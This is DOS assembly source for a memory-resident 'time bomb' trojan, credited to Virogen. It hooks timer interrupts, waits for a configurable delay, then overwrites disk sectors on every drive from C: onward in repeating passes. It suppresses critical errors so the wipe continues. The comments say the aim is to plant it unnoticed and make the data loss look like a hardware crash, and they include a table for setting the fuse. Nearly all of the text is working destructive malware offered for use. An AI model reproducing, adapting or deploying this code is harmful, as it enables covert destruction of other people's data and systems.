;
;          컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
;                     TiMeBoMB v1.0 - By Virogen
;          컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
;**************************************************************
; Warning: The following code can and will destroy data on a
;          computer system. DO NOT RUN THIS PROGRAM UNLESS
;          YOU FULLY UNDERSTAND HOW IT OPERATES. Virogen can't
;          be held responsible for damages of any kind that may
;          be caused by this program. Use at your own risk.
;***************************************************************
;
;   While I'm not much of an advocate for the needless destruction
; of data, it's necessary at times. So..here is a short program
; demonstrating how easy it is to write a trojan which can remain
; memory resident until X amount of time has passed, and then
; activate. All other system operations should perform as normal
; while the bomb is counting down. Obviously if you're needing
; to kill a system while physically at it this method is superior
; to a standard trojan. You install it, walk away, other people
; use the system, everything appears normal, then BANG all disks
; possible are rendered useless.
;   The following code will install a time bomb which will load
; itself memory resident and then wait until a specified amount
; of time has passed before it destroyes all disks. Upon activation
; the first 1000 sectors of drives A:-Z: will be overwritten, then
; after all drives have been processed, it will do the same thing
; again overwriting the first 2000 sectors, then 3000, 4000 etc..
; The drives will be killed in the order of :
;  C:,B:,A:,D: thru Z:
; Since drive C: is usually the most critical drive to be killed,
; it is done first just to ensure that the user can't respond quickly
; and powerdown before it is overwritten. The critical error handler
; is hooked so that invalid drives won't stop the process.
; There will be no other effects at the time of activation. It will
; probably appear as a legitmate hard drive crash to the ignorantly
; impaired since there would be no reason to believe otherwise.
;
title	.timebomb
segment	cseg
	assume	cs: cseg, ds: cseg, es: cseg, ss: cseg

org	100h
start_mem:
jmp	end_mem			; skip to installation
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
; New INT 8h (clock tick) handler. This interrupt is called approximatly
; 18.2065 times per second.  So, to figure up how many clock ticks will
; be needed to activate after a certain amount of seconds, use the following
; formula:
; SECS x 18.2065 = clock ticks needed
; you must then round the result to remove decimal digits. Note that the
; following code does not support an activation wait of any longer than
; 65536 clock ticks. Which means you're limited to a "fuse" of approx.
; 3599 seconds (or 59 minutes).  To change the number of clock ticks
; see the variable tick_cnt below.
;
new8:
	cmp	cs: now,2	; are we activating right now?
	je	jump_8		; yep..let's skip directly to the original int8
	dec	cs: tick_cnt	; decrement tick counter
	jnz	jump_8		; if we haven't reached zero then jump to int8
	mov	cs: now,1	; counter is 0- ready for activation
jump_8:	db	0eah		; jump far to original interrupt 8
old8_ofs dw	0
old8_seg dw	0
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
; New interrupt 1Ch - timer tick - when this interrupt is called and
;  the NOW variable is set to 1, the bomb activates. You can easily hook
;  another interrupt here, and wait until a specific system function
;  before activation.
;
new1c:	cmp	cs: now,1	; time to activate?
	je	activate	; yep..let's go.. else nope
jump_1c:
	db	0eah		; jump far to original interrupt 1ch
old1c_ofs dw	0
old1c_seg dw	0
activate:
	mov	cs: now,2	; don't want to have multiple activations
	cli			; turn off maskable interrupts
	xor	ax,ax		;
	mov	es,ax		; es=0
	Mov	es: [24h*4+2], offset new24 ; set new critical error handler
	mov	es: [24h*4], cs	; our handler's segment
start_kill:
        mov     al,02           ; start with killing drive C:
        add     cs:max_sec,1000
drive_loop:
        xor     dx,dx           ; starting logical sector to write
        xor     bx,bx           ; address of buffer (any address will do)
	mov	cx,100		; number of sectors to write
        push    ax
sec_loop:
        int     26h             ; kill 100 sectors at a time
        pop     sp              ; get flags off stack
        jc      new_drive       ; if error skip this drive
        cmp     dx,cs:max_sec   ; have we reached the the max to kill?
        je      new_drive       ; yep..don't kill any more
	add	dx,100		; increment sector # by 100
	jmp	sec_loop	; go kill the next 100 sectors
new_drive:
        pop     ax
        cmp     al,25           ; just killed drive Z:?
        je      start_kill      ; yep.. start this whole thing again
        cmp     al,2            ; just killed drive A:,B:,or C:?
	jg	inc_al		; nope..go increment drive
        cmp     al,0            ; already killed drive A:? start with D: and inc
        je      new_al          ; yep.. skip back to drive D:
        dec     al              ; else..decrement drive
	jmp	drive_loop	; go kill drive
new_al:	mov	al,2		; drive C:+1=D:
inc_al:	inc	al		; goto next drive C:-max
	jmp	drive_loop	; kill next logical drive
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
; New critical error handler (INT 24h) - always fails calls. Only
;  used at the time of activation. Critical errors will not stop the
;  disk kill.
;
new24:
	mov	al,2
	iret
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
; Data area for resident routines
;
tick_cnt dw    32772            ; ticks to wait before activation (30 mins)
				;  change this value to the time you need
				;  to wait before activation. Here are a
				;  few quick calculations:
				;     1 minute=1092
				;     5 minutes=5462
				;    15 minutes=16386
				;    30 minutes=32772
				;    45 minutes=49158
				;    59 minutes=64451
				;    **MAX IS 65536 (59.9 mins)**
now	db	0		; signal INT 16h to activate
max_sec dw      0               ; max number of sectors to write - increments
                                ; by 1000 per entire loop of drives A:-Z:
end_mem:                        ; end of memory resident code
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
; Runtime portion of bomb - installs itself in memory just below the 640k
;  conventional memory size will have decresed slightly. The code does
;  not prevent the bomb from being loaded multiple times basically because
;  it won't hurt anything.
;

        mov     ax,cs           ; PSP segment
	dec	ax		; mcb=psp-1
	mov	ds,ax		; DS=MCB

	sub	word ptr ds: [3],(((end_mem-start_mem+1023)*2)/1024)*64 ; shrink block
	sub	word ptr ds: [12h],(((end_mem-start_mem+1023)*2)/1024)*64
	mov	es,word ptr ds: [12h] ; get high mem seg

        mov     si,0100h
	mov	cx,(offset end_mem - offset start_mem)/2+1
	push	cs
	pop	ds
	mov	di,100h		; New location in upper memory
	rep	movsw		; Copy bomb to upper memory
				; (just below 640k boundary)
	xor	ax,ax
	mov	ds,ax		; null ds
	push	ds		; save ds
	lds	ax,ds: [8h*4]	; get old int 8h seg:off
	mov	es: old8_seg,ds	; save them
	mov	es: old8_ofs,ax
	pop	ds		; restore ds
	cli			; interrupts off
	mov	ds: [8h*4+2],es	; new int 8h seg
	mov	ds: [8h*4],offset new8 ; new offset
	sti			; interrupts on
	push	ds		; save ds again
	lds	ax,ds: [1ch*4]	; get old Int 1Ch seg:off
	mov	es: old1c_seg,ds ; save them
	mov	es: old1c_ofs,ax ;
	pop	ds		; restore ds
	cli			; interrupts off
	mov	ds: [1ch*4+2],es ; new segment
	mov	ds: [1ch*4],offset new1c ; new offset
	sti			; interrupts on
				; reduce conventional memory size
	sub	byte ptr ds: [413h],((offset end_mem-offset start_mem+1023)*2)/1024

	mov	ah,4ch		; exit
	int	21h
copright db     ' TiMeBoMb v1.0 (copyphrealy) Virogen '
cseg	ends
	end	start_mem
